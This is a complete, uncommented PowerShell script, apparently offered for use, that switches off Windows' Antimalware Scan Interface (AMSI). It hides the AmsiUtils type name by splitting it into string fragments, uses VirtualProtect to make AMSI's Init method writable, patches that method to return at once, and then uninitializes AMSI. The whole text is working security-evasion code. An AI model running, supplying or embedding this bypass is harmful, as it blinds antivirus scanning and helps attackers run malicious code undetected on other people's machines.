
$lib = @"
using System;
using System.Runtime.InteropServices;

public class lib {
	[DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $lib

$theclass = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') 
$InitMethod = $theclass | Where-Object Name -eq Init
$UninitMethod = $theclass | Where-Object Name -eq Uninitialize
$initPtr = $InitMethod.MethodHandle.GetFunctionPointer()
$p = 0
[lib]::VirtualProtect($initPtr, [uint32]1, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $initPtr, 1)
$uninitMethod.Invoke($null, $null)
